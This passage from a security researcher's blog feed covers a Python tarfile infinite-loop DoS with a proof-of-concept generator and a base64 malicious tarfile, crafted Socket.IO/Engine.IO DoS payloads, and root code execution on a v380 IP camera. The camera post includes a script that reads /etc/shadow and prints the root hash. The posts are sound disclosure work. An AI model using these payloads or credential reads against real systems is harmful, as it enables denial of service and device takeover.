<code>pip install recursion.tar</code>. I'd imagine that the pypi server is vulnerable to this, but untrusted tarfiles aren't ingested by too many python services as far as I'm aware.</p>\n<p>Script for minimal reproducing tarfile:</p>\n<pre class=\"language-python\" tabindex=\"0\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">make_file</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">:</span>\n    header <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span>\n    header<span class=\"token punctuation\">[</span><span class=\"token number\">0x7c</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x31</span>  <span class=\"token comment\"># size = ASCII '1' (must be > 0)</span>\n    header<span class=\"token punctuation\">[</span><span class=\"token number\">0x94</span><span class=\"token punctuation\">:</span><span class=\"token number\">0x9d</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">b\"000630\\x00 g\"</span>  <span class=\"token comment\"># chksum + typeflag 'g'</span>\n    <span class=\"token keyword\">return</span> header <span class=\"token operator\">+</span> <span class=\"token string\">b\"0 X=\"</span>\n\n\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"recursion.tar\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"wb\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>make_file<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n<h4 id=\"downloads\" tabindex=\"-1\">Downloads <a class=\"header-anchor\" href=\"https://blog.caller.xyz/python-tarfile-infinite-loop-dos/\">#</a></h4>\n<ul>\n<li><a href=\"https://bugs.python.org/file49309/recursion.tar\">an evil tarfile</a></li>\n<li>base64 decode this tar.gz <code>H4sICANcB18AA3gAS0pOzMlJLWIYCGCIQ9zAwMjQ1JRBIZ2urhmZwEAhwhYAT1CwIgQCAAA=</code></li>\n</ul>\n",
			"date_published": "2020-07-08T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/wo-men-du-bu-wan-mei/",
			"url": "https://blog.caller.xyz/wo-men-du-bu-wan-mei/",
			"title": "我們都不完美",
			"content_html": "<p>我剛看了這部於2012年發行的新加坡電影。</p>\n<p>我最喜歡的場面是黑社會大老闆斥責黑幫之一。</p>\n<p>第33分钟左右：</p>\n<p><a href=\"https://www.youtube.com/embed/eLYOr0D3rSM?clip=Ugkx0vTyjZFp3ItG4IhvgeLQTV8RKkI9bLQC&amp;clipt=EODYPBjI3T0\">Watch clip</a></p>\n",
			"date_published": "2020-07-01T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/socketio-engineio-dos/",
			"url": "https://blog.caller.xyz/socketio-engineio-dos/",
			"title": "SocketIO / EngineIO DoS",
			"content_html": "<p>Quite a while ago, I reported an application Denial of Service vulnerability in the Socket.IO / Engine.IO parser implementations in nodejs and python.\nA single HTTP POST request can cause extreme CPU and memory usage, but in nodejs, a single HTTP POST request can even kill the server with a <code>Javascript heap out of memory</code> fatal error.</p>\n<p>I assume some of what I've written is incorrect as I'm not an expert on v8 internals, but I do really love getting to the bottom of edge-case performance issues.</p>\n<h1 id=\"protocol\" tabindex=\"-1\">Protocol <a class=\"header-anchor\" href=\"https://blog.caller.xyz/socketio-engineio-dos/\">#</a></h1>\n<p>The <a href=\"https://github.com/socketio/engine.io-protocol\">engine.io protocol</a> allows bi-directional communication between a server and client, abstracting away the actual transport. The transport can be WebSockets, but if that isn't supported then another transport such as HTTP long polling is possible.</p>\n<p>When the WebSocket transport is used, packets are encapsulated by the engine.io protocol. First there is a number specifying the <a href=\"https://github.com/socketio/engine.io-protocol#packet\">packet type</a>. For instance, ping packets starting with <code>2</code> are sent as WebSocket data even though WebSocket has its own heartbeat mechanism. Sending the JSON data <code>{&quot;a&quot;: 123}</code> requires prefixing with a <code>4</code>. The socket.io protocol on top of that, if used, will add a <code>2</code> prefix meaning <a href=\"https://github.com/socketio/socket.io-protocol#packet\">EVENT</a>, so a WebSocket listener will receive <code>&quot;42{\\&quot;a\\&quot;:123}&quot;</code>.</p>\n<p>Using the long-polling transport, a payload containing multiple packets can be sent. In <a href=\"https://github.com/socketio/engine.io-protocol/tree/v3#payload\">version 3 of the protocol</a>, the payload is encoded as:</p>\n<pre><code>&lt;length1&gt;:&lt;packet1&gt;[&lt;length2&gt;:&lt;packet2&gt;[...]]\n</code></pre>\n<p>e.g <code>6:42[{}]11:4abcdefghij1:2</code> contains 3 packets:</p>\n<ol>\n<li>Socket.io packet of length 6: Message (4), Event (2, <code>[{}]</code>)</li>\n<li>Packet of length 11: Message (4), Data (<code>abcdefghij</code>)</li>\n<li>Packet of length 1: Ping (2)</li>\n</ol>\n<p>With WebSockets, the 3 packets would be sent separately. With HTTP long polling, the payload would be POSTed to <code>http(s)://host/socket.io/?EIO=3&amp;transport=polling&amp;sid=$SESSIONID</code>.</p>\n<p>The denial-of-service bug lies in:</p>\n<ul>\n<li>Inefficient parsing of packets from payloads</li>\n<li>Maximum HTTP body size of 100MB</li>\n</ul>\n<h1 id=\"make-your-100mb-count\" tabindex=\"-1\">Make your 100MB count <a class=\"header-anchor\" href=\"https://blog.caller.xyz/socketio-engineio-dos/\">#</a></h1>\n<p>You can send a payload containing 1e8 bytes to the server. That's quite a huge message, but how can we cause the server the most pain and suffering?\nThe main methods are:</p>\n<ul>\n<li><strong>Many tiny packets</strong>: send 25,000,000 empty event packets <code>2:422:422:422:42</code></li>\n<li><strong>One giant int</strong>: send the largest possible packet with integer data <code>99999991:42222222222222222222...</code></li>\n<li><strong>Many heartbeats</strong>: send 33,333,333 ping packets <code>1:21:21:21:2...</code></li>\n</ul>\n<p>Loading the body string into memory automatically eats up 100MB as a starting point, but it gets a hell of a lot worse.</p>\n<h1 id=\"nodejs\" tabindex=\"-1\">Nodejs <a class=\"header-anchor\" href=\"https://blog.caller.xyz/socketio-engineio-dos/\">#</a></h1>\n<p>With NodeJS, if the ping timeout (default 30s) is exceeded then the processing appears to be cancelled. Therefore, sending a payload which is so large it doesn't reach the memory exhausting step within the ping timeout will not kill the process. It will just waste CPU for 30 seconds. Sending a slightly smaller payload instead may cause the process to exit.</p>\n<h2 id=\"many-tiny-packets\" tabindex=\"-1\">Many tiny packets <a class=\"header-anchor\" href=\"https://blog.caller.xyz/socketio-engineio-dos/\">#</a></h2>\n<p>The bug here is due to <a href=\"https://github.com/socketio/socket.io/commit/e60bd5a4da9173acba7553c9e631b79770a8c8be\">this 2016 change</a>. As the parser reads packets from the payload, it doesn't emit the <code>socket.onpacket</code> event immediately. Instead it queues up a new closure with <code>process.nextTick</code>. Since the next tick of the event loop doesn't come until all packets have been parsed, memory usage blows up.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/Y-8Vu___o9-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/Y-8Vu___o9-1200.webp 1200w\"><img alt=\"FixedQueue retaining many closures to be executed before the next tick\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/Y-8Vu___o9-1200.png\" width=\"1200\" height=\"825\"></picture><figcaption>FixedQueue retaining many closures to be executed before the next tick</figcaption></figure><p></p>\n<p><code>process.nextTick</code> stores the closures in <a href=\"https://github.com/nodejs/node/blob/master/lib/internal/fixed_queue.js\">FixedCircularBuffers inside a FixedQueue</a>. Each of these closures retains 200 bytes of heap memory (retained means that if this closure could be garbage collected, it would free this amount of heap memory). Not a lot per closure (no giant objects retained), but it adds up to ~5gb.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/wkytSCdtpO-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/wkytSCdtpO-1200.webp 1200w\"><img alt=\"A huge number of closures. Closure code (96 bytes) + context (64 bytes) + packet (72 - 32 due to double counting) = 200 bytes\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/wkytSCdtpO-1200.png\" width=\"1200\" height=\"923\"></picture><figcaption>A huge number of closures. Closure code (96 bytes) + context (64 bytes) + packet (72 - 32 due to double counting) = 200 bytes</figcaption></figure><p></p>\n<h2 id=\"one-giant-integer\" tabindex=\"-1\">One giant integer <a class=\"header-anchor\" href=\"https://blog.caller.xyz/socketio-engineio-dos/\">#</a></h2>\n<p>This is best explained by looking at <a href=\"https://github.com/socketio/socket.io-parser/commit/dcb942d24db97162ad16a67c2a0cf30875342d55\">my fix</a>.</p>\n<p>Luckily string concatenation in v8 doesn't create an entirely new string like in some languages where string builders are required. Instead, <code>a + b</code> becomes <code>ConsString { first = a, second = b }</code> pointing to the two smaller strings. There are even optimised versions <code>ConsOneByteString</code> and <code>ConsTwoByteString</code>.</p>\n<p>Sending the &quot;One giant int&quot; packet can cause OOM via building up many many\n<code>ConsOneByteString</code> objects (32 bytes each) due to concatenation:\n99999989 <code>ConsOneByteString</code>s and then converting the massive integer to\na <code>Number</code>.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/AVEvjBVShA-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/AVEvjBVShA-1200.webp 1200w\"><img alt=\"ConsOneByteString\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/AVEvjBVShA-1200.png\" width=\"1200\" height=\"884\"></picture><figcaption>ConsOneByteString</figcaption></figure><p></p>\n<pre class=\"language-txt\" tabindex=\"0\"><code class=\"language-txt\">==== JS stack trace =========================================\n\n    0: ExitFrame [pc: 0x13c5b79]\nSecurity context: 0x152fe7b808d1 &lt;JSObject>\n    1: decodeString [0x2dd385fb5d1] [/node_modules/socket.io-parser/index.js:~276] [pc=0xf59746881be](this=0x175d34c42b69 &lt;JSGlobal Object>,0x14eccff10fe1 &lt;Very long string[69999990]>)\n    2: add [0x31fc2693da29] [/node_modules/socket.io-parser/index.js:242] [bytecode=0xa7ed6554889 offset=11](this=0x0a2881be5069 &lt;Decoder map = 0x3ceaa8bf48c9>,0x14eccff10fe1 &lt;Very...\n\nFATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory\n 1: 0xa09830 node::Abort() [node]\n 2: 0xa09c55 node::OnFatalError(char const*, char const*) [node]\n 3: 0xb7d71e v8::Utils::ReportOOMFailure(v8::internal::Isolate*, char const*, bool) [node]\n 4: 0xb7da99 v8::internal::V8::FatalProcessOutOfMemory(v8::internal::Isolate*, char const*, bool) [node]\n 5: 0xd2a1f5  [node]\n 6: 0xd2a886 v8::internal::Heap::RecomputeLimits(v8::internal::GarbageCollector) [node]\n 7: 0xd37105 v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::GCCallbackFlags) [node]\n 8: 0xd37fb5 v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) [node]\n 9: 0xd3965f v8::internal::Heap::HandleGCRequest() [node]\n10: 0xce8395 v8::internal::StackGuard::HandleInterrupts() [node]\n11: 0x1042cb6 v8::internal::Runtime_StackGuard(int, unsigned long*, v8::internal::Isolate*) [node]\n12: 0x13c5b79  [node]</code></pre>\n<h2 id=\"many-heartbeats\" tabindex=\"-1\">Many heartbeats <a class=\"header-anchor\" href=\"https://blog.caller.xyz/socketio-engineio-dos/\">#</a></h2>\n<p>This causes OOM as many pongs are created to reply to all the pings.</p>\n<h1 id=\"python\" tabindex=\"-1\">Python <a class=\"header-anchor\" href=\"https://blog.caller.xyz/socketio-engineio-dos/\">#</a></h1>\n<p>With eventlet, a single payload can DoS the entire server until processing completes due to the absence of <code>eventlet.sleep</code> calls. Without eventlet, the non-production server remains responsive until the thread pool is exhausted, so requires more than 1 concurrent request.</p>\n<h2 id=\"many-tiny-packets-special\" tabindex=\"-1\">Many tiny packets (special) <a class=\"header-anchor\" href=\"https://blog.caller.xyz/socketio-engineio-dos/\">#</a></h2>\n<p>Payload: <code>2:4¼2:4¼2:4¼2:4¼2:4¼2:4¼...</code></p>\n<p>When non-ascii characters are present in the payload,</p>\n<pre class=\"language-python\" tabindex=\"0\"><code class=\"language-python\">encoded_payload<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">,</span> errors<span class=\"token operator\">=</span><span class=\"token string\">'ignore'</span><span class=\"token punctuation\">)</span></code></pre>\n<p>is much slower:</p>\n<pre class=\"language-bash\" tabindex=\"0\"><code class=\"language-bash\"><span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">N</span><span class=\"token operator\">=</span><span class=\"token number\">100000</span><span class=\"token punctuation\">;</span> python <span class=\"token parameter variable\">-m</span> timeit <span class=\"token parameter variable\">-s</span> <span class=\"token string\">\"x=b'2:42' * <span class=\"token variable\">$N</span>\"</span> <span class=\"token string\">\"x.decode('utf-8', errors='ignore')\"</span><span class=\"token punctuation\">;</span> python <span class=\"token parameter variable\">-m</span> timeit <span class=\"token parameter variable\">-s</span> <span class=\"token string\">\"x=b'2:4<span class=\"token entity\" title=\"\\xbc\">\\xbc</span>' * <span class=\"token variable\">$N</span>\"</span> <span class=\"token string\">\"x.decode('utf-8', errors='ignore')\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token number\">10000</span> loops, best of <span class=\"token number\">3</span>: <span class=\"token number\">37.6</span> usec per loop\n<span class=\"token number\">10</span> loops, best of <span class=\"token number\">3</span>: <span class=\"token number\">29.3</span> msec per loop\n\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">N</span><span class=\"token operator\">=</span><span class=\"token number\">10000000</span><span class=\"token punctuation\">;</span> python <span class=\"token parameter variable\">-m</span> timeit <span class=\"token parameter variable\">-s</span> <span class=\"token string\">\"x=b'2:42' * <span class=\"token variable\">$N</span>\"</span> <span class=\"token string\">\"x.decode('utf-8', errors='ignore')\"</span><span class=\"token punctuation\">;</span> python <span class=\"token parameter variable\">-m</span> timeit <span class=\"token parameter variable\">-s</span> <span class=\"token string\">\"x=b'2:4<span class=\"token entity\" title=\"\\xbc\">\\xbc</span>' * <span class=\"token variable\">$N</span>\"</span> <span class=\"token string\">\"x.decode('utf-8', errors='ignore')\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token number\">100</span> loops, best of <span class=\"token number\">3</span>: <span class=\"token number\">9.08</span> msec per loop\n<span class=\"token number\">10</span> loops, best of <span class=\"token number\">3</span>: <span class=\"token number\">2.95</span> sec per loop</code></pre>\n<p>As engineio reads a packet, it decodes the entire remaining payload and\nthen advances the length of the packet. So for an N-packet payload, the\ndecode function is applied to:</p>\n<ul>\n<li>(string of N packets)</li>\n<li>(string of N-1 packets)</li>\n<li>(string of N-2 packets)</li>\n</ul>\n<p>so slowing down the decoding makes the DoS much more potent as it's O(n<sup>2</sup>)!</p>\n<p>This was <a href=\"https://github.com/miguelgrinberg/python-engineio/commit/64a34fc1550458ded57014301d5f9e97534f0843#diff-a2b90c63f58ef76954869020513f8e9bL72\">fixed by the maintainer</a>.</p>\n<h2 id=\"all-others\" tabindex=\"-1\">All others <a class=\"header-anchor\" href=\"https://blog.caller.xyz/socketio-engineio-dos/\">#</a></h2>\n<p>The python code seems to generally run slower than the nodejs code. Large payloads cause DoS primarily by wasting CPU time since python doesn't have a max heap size in the same way as v8. One giant int is slow as <code>int(&quot;2&quot; * int(1e7))</code> is incredibly slow in python, perhaps because it allows Unicode digits like ٣ as well.</p>\n<h1 id=\"exploit\" tabindex=\"-1\">Exploit <a class=\"header-anchor\" href=\"https://blog.caller.xyz/socketio-engineio-dos/\">#</a></h1>\n<p>I made a repo <a href=\"https://github.com/bcaller/kill-engine-io\"><img alt=\":octocat:\" src=\"https://github.githubassets.com/images/icons/emoji/octocat.png?v8\" style=\"max-width: 1em; max-height: 1em; display: inline-block;\">bcaller/kill-engine-io</a> containing test servers and code to trigger the DoS. Enjoy.</p>\n<p>Servers with a lower max HTTP body size are less vulnerable. In fact, the default has been lowered in newer versions.</p>\n",
			"date_published": "2020-05-07T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/v380-ipcam-firmware-patching/",
			"url": "https://blog.caller.xyz/v380-ipcam-firmware-patching/",
			"title": "v380 IPcam: Firmware patching",
			"content_html": "<p>I made some progress:</p>\n<ul>\n<li>Running code from a micro SD card as root</li>\n<li>Downloading camera firmware</li>\n<li>Writing custom firmware patches</li>\n<li>Finding the root password hash</li>\n<li>Changing the root password</li>\n</ul>\n<!-- SUMMARY END -->\n<p>To see what's going on, you'll need to pop open the camera casing and connect USB UART to <code>screen</code> or similar as in <a href=\"https://blog.caller.xyz/v380-ipcam-hardware-hackz/\">#1</a>. Also you need a micro SD card.</p>\n<h2 id=\"prelude\" tabindex=\"-1\">Prelude <a class=\"header-anchor\" href=\"https://blog.caller.xyz/v380-ipcam-firmware-patching/\">#</a></h2>\n<p>To actually get RTSP working on the camera, I had to <a href=\"https://community.netcamstudio.com/t/v380-stream-url/2778/37\">patch the firmware</a> and <a href=\"https://mybroadband.co.za/forum/threads/v380-ip-camera.875288/#post-24129369\">enable RTSP</a> via the <code>ceshi.ini</code> file. The patch file was provided on a forum from someone who emailed v380 tech support.</p>\n<h2 id=\"structure-of-patch-zip\" tabindex=\"-1\">Structure of patch zip <a class=\"header-anchor\" href=\"https://blog.caller.xyz/v380-ipcam-firmware-patching/\">#</a></h2>\n<p>Reverse-engineering that patch <code>AK3918E-V200_V.2.5.9.5 .zip</code> was my first step to understanding the camera.\nThe zip file looks like this:</p>\n<pre><code>$ als AK3918E-V200_V.2.5.9.5\\ .zip\nArchive:  AK3918E-V200_V.2.5.9.5 .zip\n  Length      Date    Time    Name\n---------  ---------- -----   ----\n       50  2019-07-13 10:18   local_update.conf\n        0  2019-07-13 10:18   patch_reuse\n        0  2019-07-13 10:18   updatepatch/\n  3451562  2019-07-13 10:18   updatepatch/5d4315195544f84f54a52ac757ce200e.patch\n</code></pre>\n<p>where <code>local_update.conf</code> contains the name of the patch file (its MD5 hash)</p>\n<pre class=\"language-toml\" tabindex=\"0\"><code class=\"language-toml\"><span class=\"token punctuation\">[</span><span class=\"token table class-name\">PATCH</span><span class=\"token punctuation\">]</span>\n<span class=\"token key property\">patchmd5</span><span class=\"token punctuation\">=</span>5d4315195544f84f54a52ac757ce200e</code></pre>\n<p>To upgrade the camera, unzip to the root of an sd card, put the card in the camera and boot it up.\nYou'll hear\n<audio id=\"gjgxks\" src=\"https://blog.caller.xyz/v380-ipcam-firmware-patching/%7Battach%7Dsf_updatestart_cn.mp3\" preload=\"none\"></audio>\n<button class=\"play\" style=\"background:none;border:none;cursor:pointer;\" onclick=\"gjgxks.play()\">▶</button>\n固件更新開始 (<span class=\"pyin\"><span class=\"pyin4 pyineiv\">gù</span><span class=\"pyin4\">jiàn</span><span class=\"pyin1\">gēng</span><span class=\"pyin1\">xīn</span><span class=\"pyin1 pyineiv\">kāi</span><span class=\"pyin3 pyineiv\">shǐ</span></span>) and after a few minutes it should reboot itself.</p>\n<h3 id=\"binwalk-patch\" tabindex=\"-1\">Binwalk patch <a class=\"header-anchor\" href=\"https://blog.caller.xyz/v380-ipcam-firmware-patching/\">#</a></h3>\n<p>The structure of the patch file wasn't clear (<code>file</code> just said it was data), so I ran <code>binwalk -e</code> on it.\nThe most interesting file it extracted was a squashfs file system containing some ARM32 ELFs.</p>\n<pre><code>squashfs-root/apps:\nas9nvserver     gpiotest    log_server  prerun\nas9updatednsip  gzip        motor_test  recorder\ndaemon          hu_updater  mqtt_test   vsipbroadcast\neventhub_core   hwwtd       mvrtsp      wpa_cli_lite\n\nsquashfs-root/lib:\nlibcurl.so.4                 libmvs_ctk.so         libmvs_tls.so\nlibHYWideAreaObjectTrack.so  libmvs_lch_client.so  libonvif.so\nlibmval_eventhub.so          libmvs_lch.so         libopencv_core.so\nlibmvs_assisttools.so        libmvs_mdq.so         libopencv_imgproc.so\nlibmvs_clog.so               libmvs_memp.so\nlibmvs_core.so               libmvs_pcc.so\n\nsquashfs-root/modules:\nakcamera.ko        aw_gpio_moto_driver.ko  sensor_h42.ko     sensor_sc1135.ko\nakcamera_n1.ko     i2c-gpio-soft.ko        sensor_h62.ko     sensor_sc1145.ko\nakcamera_n2.ko     mv_motor_driver.ko      sensor_sc1035.ko  sensor_sc1235.ko\nak_gpio_i2c.ko     otg-hs.ko               sensor_sc1037.ko  sensor_sc1245.ko\nak_sar_adc_drv.ko  sensor_gc1034.ko        sensor_sc1045.ko\n</code></pre>\n<p>I then spent some time looking through strings with <code>rabin2 -zzz</code> and grepping for things.</p>\n<h2 id=\"hu-updater-prerun\" tabindex=\"-1\">hu_updater / prerun <a class=\"header-anchor\" href=\"https://blog.caller.xyz/v380-ipcam-firmware-patching/\">#</a></h2>\n<p>I loaded <code>hu_updater</code> into Ghidra and it did really well at disassembling ARM code. (I should really have looked at <code>prerun</code>, but the relevant code is similar).</p>\n<h3 id=\"patch-file-format\" tabindex=\"-1\">Patch file format <a class=\"header-anchor\" href=\"https://blog.caller.xyz/v380-ipcam-firmware-patching/\">#</a></h3>\n<p>From this I was able to reverse-engineer the patch file format. It uses little-endian 32-bit integers and null-terminated strings.</p>\n<p>The header of size 0x80 needs the following parts:</p>\n<ul>\n<li>0x00: 0x0a</li>\n<li>0x04: <code>V380E2_C</code> / <code>V380E2_CA</code> This is the <code>hwname</code> defined in <code>/mnt/mtd/mvconf/patchmanage.conf</code> which depends on the firmware version you have. If this is wrong, there will be a log message containing the expected value: <code>patch not match &lt;V380E2_CA&gt;:&lt;V380E2_C&gt; failed.</code>.</li>\n<li>0x14: <code>0x1f4b59</code> a version</li>\n<li>0x18: Number of files in the patch</li>\n</ul>\n<p>Each file contains a header of size 0x40 before the file contents:</p>\n<ul>\n<li>The filename</li>\n<li>0x38: File size</li>\n</ul>\n<p>As an example, the patch file from the zip file looks like:</p>\n<pre class=\"language-hexdump\" tabindex=\"0\"><code class=\"language-hexdump\">00000000  0a 00 00 00 56 33 38 30  45 32 5f 43 00 00 00 00  |....V380E2_C....|\n00000010  00 00 00 00 59 4b 1f 00  15 00 00 00 aa aa 34 00  |....YK........4.|\n00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00000080  65 78 73 68 65 6c 6c 5f  61 66 75 2e 73 68 00 00  |exshell_afu.sh..|\n00000090  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n000000b0  00 00 00 00 00 00 00 00  1b 05 00 00 87 7f 00 00  |................| # Length 0x051b\n000000c0  23 21 2f 62 69 6e 2f 73  68 0a 0a 6e 65 65 64 5f  |#!/bin/sh..need_|\n... Contents of exshell_afu.sh ...\n000005c0  6d 74 64 2f 6d 76 63 6f  6e 66 2f 70 61 74 63 68  |mtd/mvconf/patch|\n000005d0  6d 61 6e 61 67 65 2e 63  6f 6e 66 65 78 73 68 65  |manage.confexshe| # EOF / next header\n000005e0  6c 6c 5f 62 66 75 2e 73  68 00 00 00 00 00 00 00  |ll_bfu.sh.......|\n...</code></pre>\n<p>I wrote a tool <a href=\"https://github.com/bcaller/v380-ipcam-firmware-patch/\"><img alt=\":octocat:\" src=\"https://github.githubassets.com/images/icons/emoji/octocat.png?v8\" style=\"max-width: 1em; max-height: 1em; display: inline-block;\">bcaller/v380-ipcam-firmware-patch</a> so you can see the files in your patch.</p>\n<h3 id=\"updater-sequence\" tabindex=\"-1\">Updater sequence <a class=\"header-anchor\" href=\"https://blog.caller.xyz/v380-ipcam-firmware-patching/\">#</a></h3>\n<ol>\n<li>The patch MD5 and hwname are checked</li>\n<li>Files are extracted from the patch to subfolders of <code>/tmp/hu_files_tmpdir/</code> depending on their prefix</li>\n<li>If it exists, <code>exshell_bfu.sh</code> is executed (bfu = before update)</li>\n<li>Generic files and sound files are copied over to <code>/mnt/mtd/</code> and <code>/mnt/mtd/mvsound/</code> respectively</li>\n<li>Kernel and <a href=\"https://en.wikipedia.org/wiki/Memory_Technology_Device\">MTD</a> images are flashed using <code>/sbin/updater</code></li>\n<li>If it exists, <code>exshell_afu.sh</code> is executed</li>\n</ol>\n<h2 id=\"run-code-as-root\" tabindex=\"-1\">Run code as root <a class=\"header-anchor\" href=\"https://blog.caller.xyz/v380-ipcam-firmware-patching/\">#</a></h2>\n<p>Let's have fun and make a patch containing <code>exshell_bfu.sh</code> e.g.:</p>\n<pre class=\"language-bash\" tabindex=\"0\"><code class=\"language-bash\"><span class=\"token shebang important\">#!/bin/sh</span>\n<span class=\"token builtin class-name\">set</span> <span class=\"token parameter variable\">-x</span>\n<span class=\"token builtin class-name\">echo</span> HELLO\n/mnt/mtd/audiofile_player /mnt/mtd/mvsound/sf_sysstarting_en.wav <span class=\"token number\">0</span>\n<span class=\"token function\">whoami</span>\n<span class=\"token function\">ls</span> /\n<span class=\"token function\">ls</span> /etc/\n<span class=\"token function\">ls</span> /mnt/\n<span class=\"token function\">cat</span> /etc/passwd\n<span class=\"token function\">cat</span> /etc/shadow\n<span class=\"token function\">ps</span> waxfu\n<span class=\"token function\">sleep</span> <span class=\"token number\">30</span></code></pre>\n<p>Use <a href=\"https://github.com/bcaller/v380-ipcam-firmware-patch/\">patchv380</a>, copy the patch to <code>/sdcard/updatepatch/</code> and alter the <code>patchmd5</code> in <code>local_update.conf</code>. Then boot up the camera. The <code>sleep 30</code> is there so that you have time to unplug the camera before it runs post-update code (probably not harmful either way).</p>\n<pre><code>IFCReadStringOnce Warning:no such file(/tmp/hu_files_tmpdir/exshells/patchrule.sh)\n+ echo HELLO\nHELLO\n+ /mnt/mtd/audiofile_player /mnt/mtd/mvsound/sf_sysstarting_en.wav 0\n=== play type : 0 ===\n--AudioFilter Version V1.8.00_svn5047, type:8000--\n## ERROR: CHIP(106552) unsupported\ncan't open the sd filter!\nopen sdfilter failed!!!!\nPlay Finished\n+ whoami\nroot\n+ ls /\nbin   dev   etc   ext   init  lib   mnt   mvs   proc  sbin  sys   tmp   usr   var\n+ ls /etc/\nbak            hosts          ld.so.conf     profile        sysconfig\nfstab          init.d         mdev.conf      resolv.conf\ngroup          inittab        nsswitch.conf  services\nhost.conf      jffs2          passwd         shadow\n+ ls /mnt/\nmtd     nand    sdcard\n+ cat /etc/passwd\nroot:x:0:0:root:/:/bin/sh\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nnobody:x:99:99:nobody:/home:/bin/sh\n\n+ cat /etc/shadow\nroot:$5$EvgtGUo1zRnZRW$Ge399ZNp3EYQP1NJt7MF1fbYjfnhtloG5m1N2KCp9l0:10933:0:99999:7:::\nbin:*:10933:0:99999:7:::\ndaemon:*:10933:0:99999:7:::\nnobody:*:10933:0:99999:7:::\n\n+ps waxfu\nPID   USER     TIME   COMMAND\n    1 root       0:01 init\n...  # I removed the kernel threads in [square brackets] for brevity\n  362 root       0:00 syslogd -n -O /var/log/messages -s 200 -b 3\n  363 root       0:00 klogd -n\n  371 root       0:00 {vg_boot.sh} /bin/sh /mnt/mtd/vg_boot.sh\n  375 root       0:00 /tmp/prerun\n  388 root       0:00 sh -c /tmp/hu_files_tmpdir/exshells/exshell_bfu.sh\n  389 root       0:00 {exshell_bfu.sh} /bin/sh /tmp/hu_files_tmpdir/exshells/ex\n  402 root       0:00 /sbin/getty -L ttySAK0 115200 vt100\n  404 root       0:00 ps waxfu\n</code></pre>\n<p>That <code>sha256crypt</code> password in the shadow file (<code>$5$EvgtGUo1zRnZRW$Ge399ZNp3EYQP1NJt7MF1fbYjfnhtloG5m1N2KCp9l0</code>) looks tough, so I tried to change the password but failed.</p>\n<pre><code>Changing password for root\nNew password: \nRetype password: \npasswd: /etc/passwd: Read-only file system\npasswd: can't update password file /etc/passwd\n</code></pre>\n<p>Not too upset as I have root anyway. We'll come back to it.</p>\n<h2 id=\"firmware-flasher\" tabindex=\"-1\">Firmware flasher <a class=\"header-anchor\" href=\"https://blog.caller.xyz/v380-ipcam-firmware-patching/\">#</a></h2>\n<p>I extracted the hardware flasher <code>cp /sbin/updater /mnt/sdcard/updater</code> and loaded it into Ghidra to see how firmware updates work.\nUpdating the kernel, nand, serial number, LOGO (not sure what that is) and mac address use <code>ioctl</code> magic, whereas updating the MTDs looks simpler.</p>\n<p>There are 5 mtd parts:</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">MTD</th>\n<th style=\"text-align:center\">Update file prefix</th>\n<th style=\"text-align:center\">Type</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">IMG_RFS</td>\n<td style=\"text-align:center\">SquashFS</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2</td>\n<td style=\"text-align:center\">IMG_USR</td>\n<td style=\"text-align:center\">SquashFS</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:center\">IMG_MVS</td>\n<td style=\"text-align:center\">SquashFS</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">4</td>\n<td style=\"text-align:center\">IMG_EXT</td>\n<td style=\"text-align:center\">SquashFS</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">5</td>\n<td style=\"text-align:center\">IMG_JFS</td>\n<td style=\"text-align:center\">jffs2</td>\n</tr>\n</tbody>\n</table>\n<p>To update 